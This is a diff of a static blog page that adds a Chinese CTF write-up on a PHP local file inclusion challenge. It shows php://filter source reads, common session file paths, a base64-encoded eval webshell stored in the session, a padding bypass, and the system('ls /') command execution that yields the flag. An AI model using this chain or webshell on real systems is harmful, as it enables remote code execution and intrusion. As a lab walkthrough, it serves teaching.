@@ -8,7 +8,7 @@
 <meta name="keywords" content="Gridea静态个人博客">
 <meta name="description" content="生如逆旅，一苇以航。">
 <meta name="theme-color" content="#000">
-<title>outlaws&#39; blog</title>
+<title>记一道session文件包含题目 | outlaws&#39; blog</title>
 <link rel="shortcut icon" href="/favicon.ico?v=1616395272964">
 <link rel="stylesheet" href="/media/css/pisces.css">
 <link rel="stylesheet" href="/media/fonts/font-awesome.css">
@@ -52,6 +52,8 @@
 
 
 
+  <meta name="description" content="记一道session文件包含题目" />
+  <meta name="keywords" content="web,LFI,base64,getshell" />
 </head>
 
 <body>
@@ -192,10 +194,26 @@
   <div class="main-continer">
     
     <div
-      class="section-layout  pisces">
+      class="section-layout pisces ">
       <div class="section-layout-wrapper">
-        <div id="sidebarMeta" class="sidebar">
-    
+        
+
+<div class="sidebar">
+  
+    <div class="sidebar-box box-shadow-wrapper bg-color right-motion" id="sidebar">
+      
+        <div class="post-list-sidebar">
+          <div class="sidebar-title">
+            <span id="tocSideBar" class="sidebar-title-item sidebar-title-active language" data-lan="index">文章目录</span>
+            <span id="metaSideBar" class="sidebar-title-item language" data-lan="preview">站点概览</span>
+          </div>
+        </div>
+      
+      <div class="sidebar-body pisces" id="sidebar_body">
+        
+          
+            <div class="post-side-meta" id="post_side_meta">
+              
 <div class="sidebar-wrapper box-shadow-wrapper bg-color">
   <div class="sidebar-item">
     <img class="site-author-image right-motion" src="/images/avatar.png"/>
@@ -244,85 +262,444 @@
 
 
 </div>
+            </div>
+            <div class="post-toc sidebar-body-active" id="post_toc" style="opacity: 1;">
+              <div class="toc-box right-motion">
+  <div class="toc-wrapper auto-number auto"
+    id="toc_wrapper">
+    <ul class="markdownIt-TOC">
+<li><a href="#%E8%80%83%E7%82%B9">考点</a></li>
+<li><a href="#%E7%A1%AE%E8%AE%A4%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F">确认利用方式</a></li>
+<li><a href="#%E6%89%BE%E5%88%B0session%E5%AD%98%E5%82%A8%E8%B7%AF%E5%BE%84">找到session存储路径</a></li>
+<li><a href="#bypass">bypass</a></li>
+<li><a href="#getflag">getflag</a></li>
+</ul>
+
+  </div>
 </div>
+
 <script>
-  let sidebarMeta = document.querySelector('#sidebarMeta');
-  let scheme = 'pisces';
-  let sidebarWrapper = document.querySelector('.sidebar-wrapper');
-  if (sidebarMeta && (scheme === 'pisces' || scheme === 'gemini')) {
-    document.addEventListener('scroll', function(e) {
-      if (document.scrollingElement.scrollTop > parseInt(sidebarMeta.style.marginTop) + 10) {
-        sidebarWrapper.classList.add('home-sidebar-fixed')
-      } else {
-        sidebarWrapper.classList.remove('home-sidebar-fixed')
+
+  let lastTop = 0, lList = [], hList = [], postBody, lastIndex = -1;
+  let active = 'active-show', activeClass = 'active-current';
+  let tocWrapper = document.querySelector('#toc_wrapper');
+  let tocContent = tocWrapper.children[0];
+  let autoNumber = tocWrapper && tocWrapper.classList.contains('auto-number');
+
+  function addTocNumber(elem, deep) {
+    if (!elem) {
+      return;
+    }
+    let prop = elem.__proto__;
+
+    if (prop === HTMLUListElement.prototype) {
+      for (let i = 0; i < elem.children.length; i++) {
+        addTocNumber(elem.children[i], deep + (i + 1) + '.');
       }
+    } else if (prop === HTMLLIElement.prototype) {
+      // 保存li元素
+      if (elem.children[0] && elem.children[0].__proto__ === HTMLAnchorElement.prototype) {
+        lList.push(elem);
+      }
+      for (let i = 0; i < elem.children.length; i++) {
+        let cur = elem.children[i];
+        if (cur.__proto__ === HTMLAnchorElement.prototype) {
+          if (autoNumber) {
+            cur.text = deep + ' ' + cur.text;
+          }
+        } else if (cur.__proto__ === HTMLUListElement.prototype) {
+          addTocNumber(cur, deep);
+        }
+      }
+    }
+  }
+
+  function removeParentActiveClass() {
+    let parents = tocContent.querySelectorAll('.' + active)
+    parents.forEach(function (elem) {
+      elem.classList.remove(active);
     });
   }
-  </script>
-        <div class="section-box tag-line box-shadow-wrapper">
-          <section class="section tags-section posts-expand bg-color">
-            <div class="padding-wrapper">
-  <div class="tag-timeline-box">
-    <div class="tag-timeline-wrapper">
-      <div class="tag-timeline-title">
-        <h2>
-          knowledge-web
-          <small class="language" data-lan="tag">标签</small>
-        </h2>
+
+  function addActiveClass(index) {
+    if (index >= 0 && index < hList.length) {
+      lList[index].classList.add(activeClass);
+    }
+  }
+
+  function removeActiveClass(index) {
+    if (index >= 0 && index < hList.length) {
+      lList[index].classList.remove(activeClass);
+    }
+  }
+
+  function addActiveLiElemment(elem, parent) {
+    if (!elem || elem === parent) {
+      return;
+    } else {
+      if (elem.__proto__ === HTMLLIElement.prototype) {
+        elem.classList.add(active);
+      }
+      addActiveLiElemment(elem.parentElement, parent);
+    }
+  }
+
+  function showToc() {
+    if (tocWrapper) {
+      postBody = document.querySelector('#post_body');
+      for (let i = 0; i < postBody.children.length; i++) {
+        if (postBody.children[i].__proto__ === HTMLHeadingElement.prototype) {
+          hList.push(postBody.children[i]);
+        }
+      }
+      if (tocWrapper.classList.contains('compress')) {
+        tocContent.classList.add('closed');
+      } else if (tocWrapper.classList.contains('no_compress')) {
+        tocContent.classList.add('expanded');
+      } else {
+        if (hList.length > 10) {
+          active = 'active-hidden'
+          tocContent.classList.add('closed');
+        } else {
+          tocContent.classList.add('expanded');
+        }
+      }
+    }
+  }
+
+  (function () {
+    // 处理不是从#一级标题开始目录
+    if (tocContent.children.length === 1 && tocContent.children[0].__proto__ === HTMLLIElement.prototype) {
+      let con = tocContent.children[0].children[0];
+      tocContent.innerHTML = con.innerHTML;
+    }
+    let markdownItTOC = document.querySelector('.markdownIt-TOC');
+    let innerHeight = window.innerHeight;
+    markdownItTOC.style = `max-height: ${innerHeight - 80 > 0 ? innerHeight - 80 : innerHeight}px`
+    addTocNumber(tocContent, '');
+  })();
+
+  document.addEventListener('scroll', function (e) {
+    if (lList.length <= 0) {
+      return;
+    }
+    let scrollTop = document.scrollingElement.scrollTop + 10;
+    let dir;
+
+    if (lastTop - scrollTop > 0) {
+      dir = 'up';
+    } else {
+      dir = 'down';
+    }
+
+    lastTop = scrollTop;
+    if (scrollTop <= 0) {
+      if (lastIndex >= 0 && lastIndex < hList.length) {
+        lList[lastIndex].classList.remove(activeClass);
+      }
+      return;
+    }
+
+    let current = 0, hasFind = false;
+    for (let i = 0; i < hList.length; i++) {
+      if (hList[i].offsetTop > scrollTop) {
+        current = i;
+        hasFind = true;
+        break;
+      }
+    }
+    if (!hasFind && scrollTop > lList[lList.length - 1].offsetTop) {
+      current = hList.length - 1;
+    } else {
+      current--;
+    }
+    if (dir === 'down') {
+      if (current > lastIndex) {
+        addActiveClass(current);
+        removeActiveClass(lastIndex)
+        lastIndex = current;
+        removeParentActiveClass();
+        lList[current] && addActiveLiElemment(lList[current].parentElement, tocContent);
+      }
+    } else {
+      if (current < lastIndex) {
+        addActiveClass(current);
+        removeActiveClass(lastIndex);
+        lastIndex = current;
+        removeParentActiveClass();
+        lList[current] && addActiveLiElemment(lList[current].parentElement, tocContent);
+      }
+    }
+  });
+
+
+  window.addEventListener('load', function () {
+    showToc();
+    document.querySelector('#sidebar').style = 'display: block;';
+    tocWrapper.classList.add('toc-active');
+    setTimeout(function () {
+      if ("createEvent" in document) {
+        let evt = document.createEvent("HTMLEvents");
+        evt.initEvent("scroll", false, true);
+        document.dispatchEvent(evt);
+      }
+      else {
+        document.fireEvent("scroll");
+      }
+    }, 500)
+  })
+
+</script>
+            </div>
+          
+        
       </div>
+    </div>
+  
+</div>
+<script>
+  const SIDEBAR_TITLE_ACTIVE = 'sidebar-title-active';
+  const SIDEBAR_BODY_ACTIVE = 'sidebar-body-active';
+  const SLIDE_UP_IN = 'slide-up-in';
+
+  let sidebar = document.querySelector('#sidebar'),
+  tocSideBar = document.querySelector('#tocSideBar'),
+  metaSideBar = document.querySelector('#metaSideBar'),
+  postToc = document.querySelector('#post_toc'),
+  postSiteMeta = document.querySelector('#post_side_meta'),
+  sidebarTitle = document.querySelector('.sidebar-title'),
+  sidebarBody = document.querySelector('#sidebar_body');
+
+  tocSideBar && tocSideBar.addEventListener('click', (e) => {
+    toggleSidebar(e);
+  });
+
+  metaSideBar && metaSideBar.addEventListener('click', (e) => {
+    toggleSidebar(e);
+  });
+
+  function toggleSidebar(e) {
+    let currentTitle = document.querySelector("."+SIDEBAR_TITLE_ACTIVE);
+    if (currentTitle == e.srcElement) {
+      return ;
+    }
+    let current, showElement, hideElement;
+    if (e.srcElement == metaSideBar) {
+      showElement = postSiteMeta;
+      hideElement = postToc;
+    } else if (e.srcElement == tocSideBar){
+      showElement = postToc;
+      hideElement = postSiteMeta;
+    }
+    currentTitle.classList.remove(SIDEBAR_TITLE_ACTIVE);
+    e.srcElement.classList.add(SIDEBAR_TITLE_ACTIVE);
+
+    window.Velocity(hideElement, 'stop');
+    window.Velocity(hideElement, 'transition.slideUpOut', {
+      display: 'none',
+      duration: 200,
+      complete: function () {
+        window.Velocity(showElement, 'transition.slideDownIn', {
+          duration: 200
+        });
+      }
+    })
+    hideElement.classList.remove(SIDEBAR_BODY_ACTIVE);
+    showElement.classList.add(SIDEBAR_BODY_ACTIVE);
+  }
+
+  postToc && postToc.addEventListener('transitionend', function() {
+    this.classList.remove(SLIDE_UP_IN);
+  });
+
+  if (sidebarBody) {
+    if (sidebarBody.classList.contains('pisces') || sidebarBody.classList.contains('gemini')) {
+      let hasFix = false;
+      let scrollEl = document.querySelector('.main-continer');
+      let limitTop = document.querySelector('#nav_ul').children.length * 42 + 162;
+      window.addEventListener('scroll', function(e) {
+        if (document.scrollingElement.scrollTop >= limitTop) {
+          if (!hasFix) {
+            sidebar.classList.add('sidebar-fixed');
+            hasFix = true;
+          }
+        } else {
+          if (hasFix) {
+            sidebar.classList.remove('sidebar-fixed');
+            hasFix = false;
+          }
+        }
+      });
+    }
+  }
+  
+</script>
+        <div class="section-box box-shadow-wrapper">
+          <div class="section bg-color post post-page">
+            <section class="post-header">
+  <h1 class="post-title">
+    <a class="post-title-link" href="https://outlaws-bai.github.io/post/LFI_session/">
+      记一道session文件包含题目
+    </a>
+  </h1>
+  <div class="post-meta">
+    
+    <span class="meta-item pc-show">
+      <i class="fa fa-calendar-o"></i>
+      <span class="language" data-lan="publish">发布于</span>
+      <span class="publish-time" data-t="2021-03-22 14:10:44">2021-03-22</span>
+      <span class="post-meta-divider pc-show">|</span>
+    </span>
+    
+    <span class="meta-item">
+      <i class="fa fa-folder-o"></i>
+      <span class="pc-show language" data-lan="category-in">分类于</span>
+      
+      
+      <a href="https://outlaws-bai.github.io/tag/UH3enqSU7/">
+        <span>web</span>
+      </a>、
       
       
       
+      <a href="https://outlaws-bai.github.io/tag/Ua8qvtTcG/">
+        <span>LFI</span>
+      </a>、
       
       
       
+      <a href="https://outlaws-bai.github.io/tag/d7ThaXMHU/">
+        <span>base64</span>
+      </a>、
       
       
       
-      
-      
-      
-      
-      
-      
-      <a href="https://outlaws-bai.github.io/post/xxe/">
-        <div class="motion-warpper">
-          <div class="tag-post-node">
-            <h1>
-              03-19
-              <small>XXE</small>
-            </h1>
-          </div>
-        </div>
+      <a href="https://outlaws-bai.github.io/tag/SxZ_xt-qo/">
+        <span>getshell</span>
       </a>
       
       
+    </span>
+    <span class="post-meta-divider">|</span>
+    
+    <span class="meta-item">
+      <i class="fa fa-clock-o"></i>
+      <span>3<span class="language" data-lan="minute">分钟</span></span>
+    </span>
+    <span class="meta-item">
+      <span class="post-meta-divider">|</span>
+      <i class="fa fa-file-word-o"></i>
+      <span>486<span class="pc-show language" data-lan="words">字数</span></span>
+    </span>
+    
+  </div>
+</section>
+            <div class="post-body next-md-body" id="post_body">
+              <h1 id="考点">考点</h1>
+<p>1.LFI(文件包含)</p>
+<p>2.session文件包含getshell</p>
+<p>3.base64</p>
+<h1 id="确认利用方式">确认利用方式</h1>
+<figure data-type="image" tabindex="1"><img src="https://outlaws-bai.github.io/post-images/1616393865233.png" alt="" loading="lazy"></figure>
+<p>进入主页，找漏洞，点击test处，存在明显LFI文件包含漏洞</p>
+<figure data-type="image" tabindex="2"><img src="https://outlaws-bai.github.io/post-images/1616393954087.png" alt="" loading="lazy"></figure>
+<p>php伪协议base64读index.php，解码后得到</p>
+<p>http://42.192.77.229:20012/?file=php://filter/convert.base64-encode/resource=index.php</p>
+<figure data-type="image" tabindex="3"><img src="https://outlaws-bai.github.io/post-images/1616393969415.png" alt="" loading="lazy"></figure>
+<p>同样继续读page.php，无敏感信息。</p>
+<p>回头想到还有test.php，同样伪协议读取后解码得到</p>
+<figure data-type="image" tabindex="4"><img src="https://outlaws-bai.github.io/post-images/1616393982743.png" alt="" loading="lazy"></figure>
+<p>确认此题应是使用php-LFI session文件包含getshell</p>
+<h1 id="找到session存储路径">找到session存储路径</h1>
+<p>测试常见session保存路径</p>
+<p>常见有</p>
+<pre><code>/var/lib/php/sess_PHPSESSID
+/var/lib/php/sessions/sess_PHPSESSID
+/var/lib/php5/sessions/sess_xxx
+/tmp/sess_PHPSESSID
+/tmp/sessions/sess_PHPSESSID
+/var/lib/sess_PHPSESSID
+</code></pre>
+<p>其中的PHPSESSID为Cookie处</p>
+<figure data-type="image" tabindex="5"><img src="https://outlaws-bai.github.io/post-images/1616393997142.png" alt="" loading="lazy"></figure>
+<p>测试后得到session路径为</p>
+<p>/var/lib/php/sessions/sess_PHPSESSID</p>
+<p>此处即为:</p>
+<p>/var/lib/php/sessions/sess_2b9ueurjdie3245hpr7kb4s615</p>
+<p>读取后得到内容</p>
+<p>user_id|s:32:&quot;PD9waHAgZXZhbCgkX1BPU1RbMV0pOz8+&quot;;views|i:5;</p>
+<p>得知此处传入的user_id是使用base64存储在session中的。猜测可否使用php伪协议解码后利用，但发现解码后为乱码且无法利用。</p>
+<h1 id="bypass">bypass</h1>
+<p>再找思路，回顾base64，是将每3位字符编码为4位字符。最后得到的编码长度必须为4的倍数，不足处添加等号=</p>
+<p>照着这个思路，只需保证base64(payload)前的可解码长度为4的倍数，则可以对一句话正常解码再利用。</p>
+<p>备注：base64对不存在码表中的字符会略过。</p>
+<p>所以base64(payload)前的user_id|s:32:&quot;，base64实际解码的是userids32，长度仅为9。</p>
+<p>备注：此处的32为len(base64(payload))</p>
+<p>所以要利用的话s处的长度必得为5位数，才能使得base64(payload)前的可解码长度为4的倍数，进而保证base64(payload)可以被解码为payload(一句话)。此处利用python得到'a'*30000</p>
+<figure data-type="image" tabindex="6"><img src="https://outlaws-bai.github.io/post-images/1616394012416.png" alt="" loading="lazy"></figure>
+<p>提交后，读取session</p>
+<figure data-type="image" tabindex="7"><img src="https://outlaws-bai.github.io/post-images/1616394025696.png" alt="" loading="lazy"></figure>
+<figure data-type="image" tabindex="8"><img src="https://outlaws-bai.github.io/post-images/1616394041882.png" alt="" loading="lazy"></figure>
+<p>/var/lib/php/sessions/sess_2b9ueurjdie3245hpr7kb4s615</p>
+<figure data-type="image" tabindex="9"><img src="https://outlaws-bai.github.io/post-images/1616394055068.png" alt="" loading="lazy"></figure>
+<h1 id="getflag">getflag</h1>
+<p>利用伪协议解码：</p>
+<p>http://42.192.77.229:20012/?file=php://filter/convert.base64-decode/resource=/var/lib/php/sessions/sess_2b9ueurjdie3245hpr7kb4s615</p>
+<p>POST：1=phpinfo();</p>
+<p>成功利用</p>
+<figure data-type="image" tabindex="10"><img src="https://outlaws-bai.github.io/post-images/1616394066494.png" alt="" loading="lazy"></figure>
+<p>1=system('ls /');</p>
+<figure data-type="image" tabindex="11"><img src="https://outlaws-bai.github.io/post-images/1616394080300.png" alt="" loading="lazy"></figure>
+<figure data-type="image" tabindex="12"><img src="https://outlaws-bai.github.io/post-images/1616394091568.png" alt="" loading="lazy"></figure>
+<p>flag{bf00afbd066e5bb54709b4ae6277d79f}</p>
+
+            </div>
+            
+            
+              <div class="post-footer">
+  <ul class="post-copyright">
+    <li class="post-copyright-author">
+      <strong class="language" data-lan="author">本文作者：</strong>
+      outlaws&#39;s blog
+    </li>
+    <li class="post-copyright-link">
+      <strong class="language" data-lan="link">本文链接：</strong>
+      <a href="https://outlaws-bai.github.io/post/LFI_session/" title="记一道session文件包含题目">https://outlaws-bai.github.io/post/LFI_session/</a>
+    </li>
+    <li class="post-copyright-license">
+      <strong class="language" data-lan="copyright">版权声明： </strong>
+      本博客所有文章除特别声明外，均采用<a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fa fa-fw fa-creative-commons"></i> BY-NC-SA</a> 许可协议。转载请注明出处！
+    </li>
+  </ul>
+  <div class="tags">
+    
+      <a href="https://outlaws-bai.github.io/tag/UH3enqSU7/"># web</a>
+    
+      <a href="https://outlaws-bai.github.io/tag/Ua8qvtTcG/"># LFI</a>
+    
+      <a href="https://outlaws-bai.github.io/tag/d7ThaXMHU/"># base64</a>
+    
+      <a href="https://outlaws-bai.github.io/tag/SxZ_xt-qo/"># getshell</a>
+    
+  </div>
+  <div class="nav">
+    <div class="nav-prev">
       
+    </div>
+    <div class="nav-next">
       
-      
-      
-      
-      
-      
-      <a href="https://outlaws-bai.github.io/post/php-serialize&amp;unserialize/">
-        <div class="motion-warpper">
-          <div class="tag-post-node">
-            <h1>
-              03-18
-              <small>php序列化与反序列化</small>
-            </h1>
-          </div>
-        </div>
-      </a>
-      
-      
-      
-      
+        <a class="nav-pc-next" title="XXE" href="https://outlaws-bai.github.io/post/xxe/">XXE</a>
+        <a class="nav-mobile-next" title="XXE" href="https://outlaws-bai.github.io/post/xxe/">下一篇</a>
+        <i class="fa fa-chevron-right"></i>
       
     </div>
   </div>
 </div>
-          </section>
+            
+            
+  
+
+          </div>
         </div>
       </div>
     </div>
@@ -528,6 +905,223 @@
     parent.insertBefore(aelem, next);
   })
 </script>
+    <div class="reward-mask" style="display: none;">
+  <div class="reward-relative">
+    <span class="close" aria-hidden="true">x</span>
+    <div class="reward-body">
+      <h2>感谢您的支持，我会继续努力的!</h2>
+      <div class="reward-img-box">
+        <div style="position: relative; width: 140px; height: 140px;">
+          
+          
+          
+        </div>
+      </div>
+      <p class="reward-word">扫码打赏，你说多少就多少</p>
+      <p class="reward-tip">打开微信扫一扫，即可进行扫码打赏哦</p>
+    </div>
+    <div class="bottom">
+      
+      
+    </div>
+  </div>
+</div>
+<style>
+  .reward-mask {
+    position: fixed;
+    z-index: 99999;
+    top: 0;
+    bottom: 0;
+    left: 0;
+    right: 0;
+    background-color: #00000054;
+  }
+
+  .reward-relative {
+    position: relative;
+    width: 480px;
+    text-align: center;
+    margin: 0 auto;
+    border-radius: 5px;
+    background-color: #fff;
+    top: 50%;
+    margin-top: -205px;
+  }
+
+  .reward-relative .close {
+    position: absolute;
+    right: 10px;
+    font-weight: normal;
+    font-size: 16px;
+    color: #929292;
+  }
+
+  .reward-body {
+    padding: 40px 20px 20px;
+  }
+
+  .bottom {
+    display: flex;
+  }
+
+  .reward-btn {
+    text-align: center;
+  }
+
+  .reward-btn-text {
+    display: inline-block;
+    cursor: pointer;
+    width: 60px;
+    height: 60px;
+    line-height: 60px;
+    border-radius: 50%;
+    background-color: #ff9734;
+    color: #FFF;
+    margin-top: 20px;
+  }
+
+  .pay-text {
+    margin-top: 10px;
+    padding: 10px;
+    flex: 1;
+    transition: all .2s linear;
+  }
+
+  .pay-text:hover {
+    background-color: #a5a5a536;
+  }
+
+  .reward-body h2 {
+    padding-top: 10px;
+    text-align: center;
+    color: #a3a3a3;
+    font-size: 16px;
+    font-weight: normal;
+    margin: 0 0 20px;
+  }
+
+  .reward-body h2:after,
+  .reward-body h2:before {
+    font-family: Arial, Helvetica, sans-serif;
+    background: 0 0;
+    width: 0;
+    height: 0;
+    font-style: normal;
+    color: #eee;
+    font-size: 80px;
+    position: absolute;
+    top: 20px;
+  }
+
+  .reward-body h2:before {
+    content: '\201c';
+    left: 50px;
+  }
+
+  .reward-body h2:after {
+    content: '\201d';
+    right: 80px;
+  }
+
+  .reward-img-box {
+    display: inline-block;
+    padding: 10px;
+    border: 6px solid #ea5f00;
+    margin: 0 auto;
+    border-radius: 3px;
+    position: relative;
+  }
+
+  .reward-img {
+    position: absolute;
+    left: 0px;
+    top: 0px;
+    width: 100%;
+    height: 100%;
+  }
+
+  @media (max-width: 767px) {
+    .reward-relative {
+      height: 100%;
+      top: 0px;
+      margin-top: 0;
+      width: auto;
+    }
+
+    .reward-relative .bottom {
+      flex-direction: column;
+    }
+
+    .reward-relative .pay-text {
+      width: 80%;
+      margin: 5px auto;
+      border: 1px solid silver;
+      padding: 6px;
+      border-radius: 4px;
+    }
+
+    .reward-body h2:after {
+      right: 40px;
+    }
+
+    .reward-body h2:after,
+    .reward-body h2:before {
+      font-size: 60px;
+    }
+
+    .reward-body h2:before {
+      left: 20px;
+    }
+  }
+</style>
+<script>
+  !function () {
+    var mask = document.querySelector('.reward-mask');
+    let close = document.querySelector('.reward-relative .close');
+    let rewardBtn = document.querySelector('.reward-btn');
+
+    let zfb = document.querySelector('#zfb'),
+      wx = document.querySelector('#wx'),
+      zfbBtn = document.querySelector('#zfbBtn'),
+      wxBtn = document.querySelector('#wxBtn');
+
+    if (zfbBtn && wxBtn) {
+      zfbBtn.addEventListener('click', () => {
+        window.Velocity(zfb, 'transition.slideLeftIn', {
+          duration: 400
+        });
+        window.Velocity(wx, 'transition.slideRightOut', {
+          display: 'none',
+          duration: 400
+        });
+      });
+
+      wxBtn.addEventListener('click', () => {
+        window.Velocity(wx, 'transition.slideRightIn', {
+          duration: 400
+        });
+        window.Velocity(zfb, 'transition.slideLeftOut', {
+          display: 'none',
+          duration: 400
+        });
+      });
+    }
+
+    rewardBtn.addEventListener('click', (e) => {
+      window.Velocity(mask, 'transition.slideDownIn', {
+        duration: 400
+      })
+    });
+
+    close.addEventListener('click', (e) => {
+      e.preventDefault();
+      window.Velocity(mask, 'transition.slideUpOut', {
+        duration: 400
+      })
+    })
+  }()
+</script>
+
   </div>
 </body>
 
@@ -1903,6 +2497,5 @@ https://xz.aliyun.com/t/2715&lt;br&gt;
 
   <div class="snow-container"></div>
   <script src="/media/js/bg/snow.js"></script>
-
 
 </html>
